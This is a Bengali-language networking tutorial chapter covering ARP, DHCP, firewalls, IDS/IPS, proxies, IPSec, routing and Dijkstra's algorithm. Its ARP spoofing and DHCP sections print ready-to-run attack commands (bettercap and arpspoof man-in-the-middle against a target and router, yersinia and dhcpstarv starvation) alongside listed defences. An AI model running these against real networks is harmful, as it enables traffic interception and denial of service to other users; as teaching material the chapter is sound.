# অধ্যায় ৬: Advanced Networking Concepts

## সহজ কথায়:
বেসিক networking তো জানলেই। এখন জটিল জিনিস — ARP কীভাবে MAC খুঁজে, DHCP কীভাবে auto-IP দেয়, Firewall কীভাবে বাধা দেয়। এইসব না বুঝলে real hacking কঠিন।

---

## ৬.১ ARP (Address Resolution Protocol)

### ARP কী?
ARP-র কাজ হলো **IP address → MAC address** রূপান্তর করা।

**Real life analogy:** তুমি রহিমকে ফোন করতে চাও। তোমার কাছে রহিমের নাম (IP) আছে, কিন্তু নাম্বার (MAC) নেই। তুমি common friend-কে জিজ্ঞেস করো "রহিমের নাম্বার কী?" — এইটাই ARP।

### ARP কীভাবে কাজ করে:

```
তোমার PC (IP: 192.168.1.5) → Server (IP: 192.168.1.10)-এ data পাঠাতে চায়

Step 1: ARP cache check করে (আগে জানলে)
         C:\> arp -a

Step 2: Cache-এ না থাকলে → Broadcast (সবাইকে জিজ্ঞেস করে)
         "Who has 192.168.1.10? Tell 192.168.1.5"

Step 3: Server reply করে
         "192.168.1.10 is at 00:1A:2B:3C:4D:5E"

Step 4: ARP cache-এ save করে → Data পাঠায়
```

### ARP Spoofing (MITM Attack):
এটা **হ্যাকারদের ফেবারিট**। ARP-র দুর্বলতা — এটি কোন validation চেক করে না।

```bash
# Kali Linux-এ ARP spoof (bettercap ব্যবহার করে):
echo "আক্রমণ শুরু..."
bettercap -eval "set arp.spoof.targets 192.168.1.10; arp.spoof on"

# অথবা classic tool:
arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
# (target কে বলছে router = আমার MAC)
arpspoof -i eth0 -t 192.168.1.1 192.168.1.10
# (router কে বলছে target = আমার MAC)
```

**কীভাবে বাঁচবে:**
- Static ARP entries
- ARP spoofing detection tools (Arpwatch, XArp)
- Dynamic ARP Inspection (managed switch-এ)

---

## ৬.২ DHCP (Dynamic Host Configuration Protocol)

### DHCP কী?
তোমার ডিভাইস যখন network-এ connect হয়, DHCP **স্বয়ংক্রিয়ভাবে IP, gateway, DNS** দেয়।

**ছাড়া DHCP:** প্রতিটি device-এ manually IP দিতে হতো — 🤯

### DHCP Process (DORA):
```
তোমার ল্যাপটপ → Router (DHCP Server)

১. Discover: "আমি newcomer, IP চাই!" (Broadcast)
২. Offer: Router বলে "192.168.1.50 নাও"
৩. Request: "ঠিক আছে, 192.168.1.50 নিচ্ছি"
৪. Ack: Router বলে "ওকে, use করো"

এই ৪ ধাপ → DORA (Discover, Offer, Request, Ack)
```

### DHCP Attacks:
- **DHCP Starvation:** Attacker অসংখ্য DHCP request পাঠায় → IP pool শেষ → legitimate user-রা IP পায় না
- **Rogue DHCP Server:** Attacker তার নিজের DHCP server চালায় → users-কে fake gateway দেয় → MITM

```bash
# DHCP starvation (Kali Linux এ):
yersinia -G

# অথবা:
dhcpstarv -i eth0
```

---

## ৬.৩ Firewall, IDS/IPS — পার্থক্য ও কাজ

### Firewall (দেয়াল)
**কাজ:** Rules অনুযায়ী traffic allow/block করা। বিল্ডিং-এর security guard-এর মতো — যে কেউ ঢুকতে চায়, check করে।

**প্রকার:**
- **Packet Filtering Firewall:** প্যাকেটের header দেখে (IP, port) allow/block — simple
- **Stateful Firewall:** Connection state track করে — smarter
- **Application Firewall:** Content-level inspection (WAF)
- **Next-Gen Firewall (NGFW):** সবকিছু + IPS + application control

```bash
# Linux iptables firewall rule উদাহরণ:
# SSH (port 22) allow শুধু specific IP থেকে
iptables -A INPUT -p tcp --dport 22 -s 192.168.1.100 -j ACCEPT

# সব incoming connection block (default)
iptables -A INPUT -j DROP

# Allow established connections
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
```

### IDS (Intrusion Detection System)
**কাজ:** Monitor করে → Suspicious activity detect → Alert দেয় (কিন্তু block করে না)

**উদাহরণ:** Snort, Zeek (formerly Bro)

### IPS (Intrusion Prevention System)
**কাজ:** IDS + Action (detect করলে block করে)

**Key Diff:**

| বৈশিষ্ট্য | Firewall | IDS | IPS |
|-----------|----------|-----|-----|
| **কাজ** | Access control | Detect | Detect + Prevent |
| **Block করে?** | ✅ (rule-based) | ❌ (alarm দেয়) | ✅ (auto block) |
| **Traffic দেখে?** | Header | Full packet | Full packet |
| **False positive** | কম | বেশি | বেশি (block করলে problem) |

---

## ৬.৪ Proxy vs Reverse Proxy — বাংলায় বিস্তারিত

### Forward Proxy (সাধারণ Proxy)
তুমি → Proxy → Internet

**কাজ:** তোমার IP লুকিয়ে proxy-র IP দেখায়।

**ব্যবহার:**
- Anonymity
- Access blocked content
- Content filtering (অফিসে Facebook block)

```bash
# Proxy ব্যবহার করে curl:
curl -x http://proxy-server:8080 https://google.com
```

### Reverse Proxy
তুমি → Reverse Proxy → Server (আসল)

**কাজ:** আসল server-কে লুকিয়ে রাখে।

**ব্যবহার:**
- Load balancing
- SSL termination
- DDoS protection
- Cache (যেমন Cloudflare)

```
তুমি মনে করো তুমি google.com-এ data পাঠাচ্ছ
কিন্তু আসলে → Cloudflare (reverse proxy) → Google server
তুমি Google server-এর IP জানতে পারো না!
```

### Forward vs Reverse:

```
Forward Proxy: তুমি লুকাও (client anonymize)
Reverse Proxy: Server লুকায় (server protect)
```

---

## ৬.৫ IPSec Protocol — VPN-এ কীভাবে ব্যবহার হয়

IPSec = IP Security। Network Layer (Layer 3)-এ encryption + authentication যোগ করে।

**দুই মোডে কাজ করে:**

### ১. Transport Mode
- শুধু payload encrypt করে (header original থাকে)
- End-to-end communication

### ২. Tunnel Mode
- পুরো প্যাকেট (header + payload) encrypt করে
- নতুন header যোগ করে
- VPN-এ সাধারণত এই mode ব্যবহার হয়

### VPN কীভাবে IPSec ব্যবহার করে:

```
তোমার PC → IPSec Tunnel → VPN Server → Internet

তোমার data: [Original IP][Data]
         ↓ (IPSec Tunnel Mode encrypt)
Encrypted: [New Header][Encrypted Original IP + Data]
         ↓
VPN Server decrypt করে original data বের করে
         ↓
Internet-এ পাঠায়
```

---

## ৬.৬ Default Gateway — কী, কেন দরকার

Default Gateway হলো **exit door** — তোমার local network থেকে বাইরে যাওয়ার পথ।

```
তোমার PC (192.168.1.5)
    ↓ (data যদি 192.168.2.10-এ যেতে চায়)
Switch → Router (Default Gateway: 192.168.1.1)
    ↓
Internet
```

**কীভাবে জানবে:**
```bash
# Windows:
ipconfig | findstr "Default Gateway"

# Linux:
ip route | grep default
```

**Gateway attack:** হ্যাকাররা যদি ARP spoof করে gateway-এর MAC চেঞ্জ করে দেয় → সব traffic হ্যাকারের কাছে যায়।

---

## ৬.৭ Routing Algorithms

### Distance Vector Routing
প্রতি router তার **neighbor**-দের কাছে distance (hop count) advertise করে।

**উদাহরণ:** RIP (Routing Information Protocol)
- Simple
- Max 15 hops
- Slow convergence

### RIP Example:
```
Router A → Router B → Router C → Destination
                3 hops

Router A-র table:
Destination | Next Hop | Distance
Network X   | Router B | 3
```

### Link State Routing
প্রতি router **সম্পূর্ণ network map** জানে।

**উদাহরণ:** OSPF (Open Shortest Path First)
- Complex
- Fast convergence
- প্রতিটি router-এর complete topology knowledge

---

## ৬.৮ Dijkstra Algorithm — Shortest Path Networking-এ

Networking-এ সবচেয়ে **shortest path** বের করার জন্য Dijkstra algorithm ব্যবহার হয়।

### সহজ ব্যাখ্যা:
```
তুমি A থেকে F-এ যেতে চাও। ৩ টা পথ:
1. A → B → D → F (১০ মিনিট)
2. A → C → D → F (১৫ মিনিট)
3. A → C → E → F (২০ মিনিট)

Dijkstra algorithm সবচেয়ে ছোট পথ (path 1) বেছে নেয়।
```

**OSPF protocol Dijkstra ব্যবহার করে shortest path calculate করার জন্য।**

```
Algorithm Steps:
1. Start node select (source)
2. সব node-এর distance = ∞ (infinite)
3. Current node-এর neighbor-দের distance update
4. Shortest distance-এর node select
5. সব node visit না হওয়া পর্যন্ত repeat
6. Shortest path tree ready
```

---

## ৬.৯ Network Security Layers

একটি complete network-এ security layers:

```
Layer 1: Physical Security
         - CCTV, access control, lock
Layer 2: Network Security
         - Firewall, IDS/IPS, VLAN, NAC
Layer 3: Endpoint Security
         - Antivirus, EDR, patch management
Layer 4: Application Security
         - WAF, secure coding, API security
Layer 5: Data Security
         - Encryption, DLP, backup
Layer 6: Identity & Access
         - MFA, SSO, PAM, Zero Trust
Layer 7: Monitoring & Response
         - SIEM, SOC, incident response
```

---

## 💡 ল্যাব এক্সারসাইজ

```
১. ARP cache দেখো:
   Windows: arp -a
   Linux: ip neigh

২. Router-এর IP বের করো:
   Windows: ipconfig
   Linux: ip route | grep default

৩. Firewall rule check (যদি থাকে):
   Windows: netsh advfirewall show allprofiles
   Linux: iptables -L -n -v

৪. Trace route using different protocols:
   tracert 8.8.8.8 (Windows)
   traceroute 8.8.8.8 (Linux)

৫. DHCP কীভাবে IP দেয় — test করো:
   Windows: ipconfig /release && ipconfig /renew
   Linux: sudo dhclient -r && sudo dhclient
```

---

## 📌 মনে রাখো

| Concept | মূল কথা |
|---------|---------|
| **ARP** | IP → MAC converter (সহজেই spoof করা যায়) |
| **DHCP** | Auto IP assignment (DORA) |
| **Firewall** | নিয়ম অনুযায়ী traffic control |
| **IDS vs IPS** | IDS দেখে, IPS দেখে + block করে |
| **Forward Proxy** | তোমাকে লুকায় |
| **Reverse Proxy** | Server-কে লুকায় |
| **IPSec** | VPN-এর encryption engine |
| **Default Gateway** | বাইরে যাওয়ার দরজা |
| **Dijkstra** | Shortest path algorithm |

**পরবর্তী অধ্যায় — WiFi ও Wireless Networking! 📡**
